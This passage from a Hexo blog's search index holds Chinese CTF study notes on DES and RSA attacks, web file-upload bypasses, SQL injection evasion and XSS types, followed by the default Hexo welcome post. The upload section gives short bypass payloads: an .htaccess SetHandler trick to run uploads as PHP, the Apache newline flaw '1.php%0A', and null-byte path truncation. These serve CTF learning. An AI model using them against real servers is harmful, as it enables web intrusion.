<h1 id="现代密码学"><a class="markdownIt-Anchor" href="#现代密码学"></a> 现代密码学</h1>
<h2 id="基础"><a class="markdownIt-Anchor" href="#基础"></a> 基础</h2>
<ul>
<li>对称加密：加密和解密采用同一密钥。</li>
<li>非对称加密：使用一堆密钥，分为公私钥，公钥加（解）密，私钥解（加）密。</li>
</ul>
<h2 id="des加密对称加密"><a class="markdownIt-Anchor" href="#des加密对称加密"></a> DES加密（对称加密）</h2>
<h3 id="简单介绍-3"><a class="markdownIt-Anchor" href="#简单介绍-3"></a> 简单介绍</h3>
<ol>
<li>密钥是56比特，明文为64比特。</li>
<li>DES的基本结构是Feistel网络；DES是一种16轮的Feistel网络；子密钥每轮都会变；</li>
<li>Feistel网络特质：
<ul>
<li>轮数任意增加；</li>
<li>加密解密结构相同；</li>
<li>解密密钥倒着输入即可；</li>
<li>任何函数都可以作为轮函数。</li>
</ul>
</li>
</ol>
<h3 id="des攻击"><a class="markdownIt-Anchor" href="#des攻击"></a> DES攻击</h3>
<ol>
<li>差分攻击：改变一部分明文并分析密文如何改变。</li>
<li>线性攻击：将明文和密文的对应比特进行异或并计算结果为0的概率。</li>
</ol>
<h2 id="rsa加密非对称加密"><a class="markdownIt-Anchor" href="#rsa加密非对称加密"></a> RSA加密（非对称加密）</h2>
<h3 id="简单介绍-4"><a class="markdownIt-Anchor" href="#简单介绍-4"></a> 简单介绍</h3>
<ol>
<li>
<p>RSA可以被用于加密解密，密钥交换，数字签名；基于大数分解难题；</p>
</li>
<li>
<p>生成公私钥的步骤：</p>
<ul>
<li>随机生成两个素数p,q;</li>
<li>计算N = p·q和欧拉函数φ(N)=(p-1)(q-1);</li>
<li>随机选择一个加密密钥e，这里1&lt;e&lt;φ(N), gcd(e,φ(N)) = 1；</li>
<li>求解e·d=1 mod φ(N) 且 0≤d≤N   （乘法逆元）；</li>
<li>发布加密密钥公钥KU = {e，N}；</li>
<li>保密解密密钥私钥KR = {d，N}。</li>
</ul>
</li>
<li>
<p>加密：</p>
<p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>C</mi><mo>=</mo><msup><mi>M</mi><mi>e</mi></msup><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mi>N</mi><mo stretchy="false">)</mo><mo separator="true">;</mo></mrow><annotation encoding="application/x-tex">C = M^e(mod N);
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">e</span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mord mathdefault" style="margin-right:0.10903em;">N</span><span class="mclose">)</span><span class="mpunct">;</span></span></span></span></span></p>
</li>
<li>
<p>解密：</p>
<p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>M</mi><mo>=</mo><msup><mi>C</mi><mi>d</mi></msup><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mi>N</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">M = C^d(modN)
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.10903em;">M</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.149108em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8991079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">d</span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mord mathdefault" style="margin-right:0.10903em;">N</span><span class="mclose">)</span></span></span></span></span></p>
</li>
<li>
<p>题型：</p>
<ul>
<li>直接解密（已知p，q，求d）；</li>
<li>N相关攻击：
<ul>
<li>分解N，最大素数公约数；</li>
<li>共模攻击：RSA体系在生成密钥的过程中使用了相同的模数n；</li>
</ul>
</li>
<li>e相关攻击：
<ul>
<li>小指数e攻击：直接爆破；</li>
<li>低加密指数广播攻击；</li>
</ul>
</li>
</ul>
</li>
</ol>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>密码学</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF-WEB文件上传,SQL注入,XXS漏洞知识学习笔记</title>
    <url>/CTF/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
    <content><![CDATA[<h1 id="ctf-web"><a class="markdownIt-Anchor" href="#ctf-web"></a> CTF-WEB</h1>
<h2 id="文件上传"><a class="markdownIt-Anchor" href="#文件上传"></a> 文件上传</h2>
<h3 id="1-前端校验"><a class="markdownIt-Anchor" href="#1-前端校验"></a> 1. 前端校验</h3>
<ul>
<li>校验方法：JavaScript判断后缀，类型等</li>
<li>绕过：Burpsuite抓包，禁用js</li>
</ul>
<h3 id="2-content-type校验"><a class="markdownIt-Anchor" href="#2-content-type校验"></a> 2. Content-Type校验</h3>
<ul>
<li>检测image/gif           $ _ FILES[‘userfile’]  [‘type’] != “image/gif”</li>
<li>http头可以随意修改，不可信</li>
<li>绕过：Burpsuite抓包</li>
</ul>
<h3 id="3-黑名单-过滤绕过"><a class="markdownIt-Anchor" href="#3-黑名单-过滤绕过"></a> 3. 黑名单 过滤绕过</h3>
<ul>
<li>可能过滤不全
<ul>
<li>.php3  .php5  .phtml</li>
<li>.htaccess</li>
</ul>
</li>
<li>大小写绕过</li>
<li>简单替换                      str_ireplace(<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>d</mi><mi>e</mi><mi>n</mi><msub><mi>y</mi><mi>e</mi></msub><mi>x</mi><mi>t</mi><msup><mo separator="true">,</mo><mrow><mo mathvariant="normal">′</mo><mo mathvariant="normal">′</mo></mrow></msup><mo separator="true">,</mo></mrow><annotation encoding="application/x-tex">deny_ext,&#x27;&#x27;,</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.946332em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">d</span><span class="mord mathdefault">e</span><span class="mord mathdefault">n</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">e</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault">x</span><span class="mord mathdefault">t</span><span class="mpunct"><span class="mpunct">,</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mpunct">,</span></span></span></span>file_name);</li>
<li>windows特性
<ul>
<li>空格 和 点 在文件末尾会被忽略</li>
<li>::$DATA 忽略</li>
</ul>
</li>
</ul>
<h3 id="4-特殊文件"><a class="markdownIt-Anchor" href="#4-特殊文件"></a> 4. 特殊文件</h3>
<ul>
<li>.htaccess全称是Hypertext Access(超文本入口)，控制目录文件行为</li>
<li>配置
<ul>
<li>AllowOverride All</li>
<li>LoadModule rewrite_module /user/lib/apache2/modules/mod_rewrite.so</li>
</ul>
</li>
<li>功能：文件夹密码保护、用户自动重定向、自定义错误页面、改变你的文件扩展名、封禁特定IP地址的用户、只允许特定地址IP的用户、禁止目录列表</li>
<li>利用：
<ul>
<li>上传.htaccess 让给定目录下所有文件被视为php解析<br />
SetHandler appllcation/x-httpd-php</li>
<li>将所有xxx结尾的文件视为php解析<br />
AddType appllcation/x-httpd-php xxx</li>
</ul>
</li>
</ul>
<h3 id="5-漏洞解析"><a class="markdownIt-Anchor" href="#5-漏洞解析"></a> 5. 漏洞解析</h3>
<ul>
<li>Apache
<ul>
<li>陌生后缀解析：从后往前解析，碰到陌生后缀跳过，直到碰到认识的后缀
<ul>
<li>apache 1.x，2.x ：<a href="http://1.php.xxx" target="_blank" rel="noopener">1.php.xxx</a> ----&gt; 先解析xxx 之后php…</li>
</ul>
</li>
<li>换行解析(CVE-2017-15715)：将换行符作为后缀解析
<ul>
<li>apache 2.4.0-2.4.29：1.php%0A</li>
</ul>
</li>
<li>nginx：cgi方式支持php解析，正则判断
<ul>
<li>条件：cgi.fix_pathinfo=1：phpinfo.jpg /1.php</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="6-00url编码-和-0x00-16进制截断"><a class="markdownIt-Anchor" href="#6-00url编码-和-0x00-16进制截断"></a> 6. %00(url编码) 和 0x00 (16进制)截断</h3>
<ul>
<li>场景：$img_path = $ _ GET[‘save_path’].&quot;/&quot;.rand(10,99).date(“YmdHls”).’’.’’.$file_ext;</li>
<li>利用
<ul>
<li>GET传参：save_path = …/upload/info.php%00</li>
<li>POST传参：save_path = …/upload/info.php\x00</li>
</ul>
</li>
</ul>
<h2 id="sql注入"><a class="markdownIt-Anchor" href="#sql注入"></a> SQL注入</h2>
<h3 id="1-典型攻击手段"><a class="markdownIt-Anchor" href="#1-典型攻击手段"></a> 1. 典型攻击手段：</h3>
<ul>
<li>判断应用程序是否存在注入漏洞</li>
<li>收集信息、并判断数据库类型</li>
<li>根据注入参数类型，重构SQL语句原貌</li>
<li>猜表名、字段名</li>
<li>获取账户信息、攻击WEB或为下一步攻击做准备</li>
</ul>
<h3 id="2-出题人套路"><a class="markdownIt-Anchor" href="#2-出题人套路"></a> 2. 出题人套路：</h3>
<ul>
<li>屏蔽关键词
<ul>
<li>加无意义符号：空格，回车，tab键</li>
<li>编码</li>
<li>替换关键词</li>
<li>拼接</li>
<li>大小写混写、双写</li>
<li>内联注释</li>
</ul>
</li>
<li>隐藏注入点
<ul>
<li>增加页面数</li>
<li>使逻辑结构复杂化</li>
<li>伪装不是注入点</li>
<li>改变注入参数(http头文件)</li>
</ul>
</li>
<li>加密
<ul>
<li>加密后在进入数据库  ffifdyop</li>
</ul>
</li>
<li>手注 + 盲注
<ul>
<li>sqlmap等工具等绕狗脚本</li>
</ul>
</li>
<li>代码审计和综合考察
<ul>
<li>扫描目录
<ul>
<li>robots.txt</li>
<li>tar、zip、bak、rar等</li>
</ul>
</li>
<li>代码审计：
<ul>
<li>通读代码（结构、功能、关键信息）</li>
<li>细审上传、数据存取、命令执行等页面</li>
<li>追踪函数</li>
</ul>
</li>
<li>寻找疑似漏洞功能</li>
</ul>
</li>
</ul>
<h2 id="xss漏洞"><a class="markdownIt-Anchor" href="#xss漏洞"></a> XSS漏洞</h2>
<h3 id="1-反射型"><a class="markdownIt-Anchor" href="#1-反射型"></a> 1. 反射型</h3>
<ul>
<li>一般不会进入服务器</li>
<li>特点：非持久性型，参数跨站脚本</li>
<li>作用：调用用户cookie或者进行钓鱼</li>
</ul>
<h3 id="2-dom型"><a class="markdownIt-Anchor" href="#2-dom型"></a> 2. dom型</h3>
<ul>
<li>新型的xss漏洞，基于js，可以归属于反射型xss</li>
</ul>
<h3 id="3-存储型"><a class="markdownIt-Anchor" href="#3-存储型"></a> 3. 存储型</h3>
<ul>
<li>进入服务器</li>
<li>特点：持久型、更具有危害性</li>
<li>作用：渗透、挂马、蠕虫病毒、钓鱼</li>
</ul>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>文件上传</tag>
        <tag>SQL注入</tag>
        <tag>XSS漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/uncategorized/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
<h2 id="quick-start"><a class="markdownIt-Anchor" href="#quick-start"></a> Quick Start</h2>
<h3 id="create-a-new-post"><a class="markdownIt-Anchor" href="#create-a-new-post"></a> Create a new post</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
<h3 id="run-server"><a class="markdownIt-Anchor" href="#run-server"></a> Run server</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
<h3 id="generate-static-files"><a class="markdownIt-Anchor" href="#generate-static-files"></a> Generate static files</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
<h3 id="deploy-to-remote-sites"><a class="markdownIt-Anchor" href="#deploy-to-remote-sites"></a> Deploy to remote sites</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>
]]></content>
  </entry>
</search>
